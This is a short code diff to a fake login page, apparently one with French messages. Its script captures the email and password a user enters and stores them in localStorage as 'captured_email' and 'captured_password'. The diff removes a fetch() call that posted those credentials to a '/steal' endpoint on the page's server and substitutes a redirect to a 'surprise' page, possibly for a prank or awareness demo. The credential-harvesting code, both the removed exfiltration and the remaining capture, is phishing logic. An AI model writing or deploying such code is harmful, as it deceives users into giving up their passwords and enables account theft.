@@ -132,28 +132,12 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Store data for the surprise page
+            // Store data in localStorage for the surprise page
             localStorage.setItem('captured_email', email);
             localStorage.setItem('captured_password', password);
 
-            // Send data to the server (Python terminal)
-            fetch('/steal', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: email, password: password })
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Redirect to surprise page
-                    window.location.href = '/surprise';
-                } else {
-                    alert('Erreur de connexion. Réessayez.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Une erreur est survenue. Réessayez.');
-            });
+            // Redirect directly to the surprise page (no server needed)
+            window.location.href = 'surprise.html';
         }
     </script>
 </body>
